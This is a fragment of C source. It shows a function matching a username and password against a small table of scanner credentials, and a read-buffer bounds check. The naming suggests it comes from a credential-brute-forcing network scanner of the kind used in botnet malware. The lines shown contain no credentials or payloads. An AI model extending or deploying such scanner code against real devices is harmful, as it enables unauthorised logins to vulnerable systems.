  for (size_t i = 0; i < SCANNER_SMALL_LEN; i++) {
    pscanner_auth_t auth = &scanner_auth_small[i];

    if (strcmp(auth->username, username) == 0 && strcmp(auth->password, password) == 0) {
      return auth;
    }
  }

  return NULL;
}

static bool can_consume(pscanner_connection_t conn, uint8_t *ptr, int amount) {
  uint8_t *end = (uint8_t *)conn->rdbuf + conn->rdbuf_pos;
  return ptr + amount < end;
}
